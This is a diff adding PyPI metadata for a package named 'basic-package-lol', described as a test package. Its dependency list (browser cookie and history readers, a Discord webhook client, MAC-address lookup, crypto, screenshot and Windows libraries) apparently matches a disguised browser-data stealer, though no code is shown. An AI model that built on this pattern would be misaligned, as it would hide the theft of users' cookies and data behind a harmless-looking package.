@@ -1,0 +1,28 @@
+Metadata-Version: 2.1
+Name: basic-package-lol
+Version: 1.0.4
+Summary: A test package to demonstrate pip packages
+Home-page: https://www.knowledgehut.com/blog/programming/how-to-publish-python-package-to-pypi
+Author: Unknown
+Author-email: Unknown@example.com
+Project-URL: Bug Tracker, https://www.knowledgehut.com/blog/programming/how-to-publish-python-package-to-pypi
+Classifier: Programming Language :: Python :: 3
+Classifier: License :: OSI Approved :: MIT License
+Classifier: Operating System :: OS Independent
+Requires-Python: >=3.6
+Description-Content-Type: text/markdown
+Requires-Dist: browser-cookie3 (>=0.15.0)
+Requires-Dist: browser-history (>=0.3.2)
+Requires-Dist: discord-webhook (>=0.16.3)
+Requires-Dist: getmac (>=0.8.3)
+Requires-Dist: prettytable (>=3.3.0)
+Requires-Dist: psutil (>=5.9.1)
+Requires-Dist: py-cpuinfo (>=8.0.0)
+Requires-Dist: pycountry (>=22.3.5)
+Requires-Dist: pycryptodome (>=3.15.0)
+Requires-Dist: pywin32 (>=304)
+Requires-Dist: requests (>=2.28.1)
+Requires-Dist: pyautogui (>=0.9.53)
+Requires-Dist: Pillow (>=9.2.0)
+
+long description
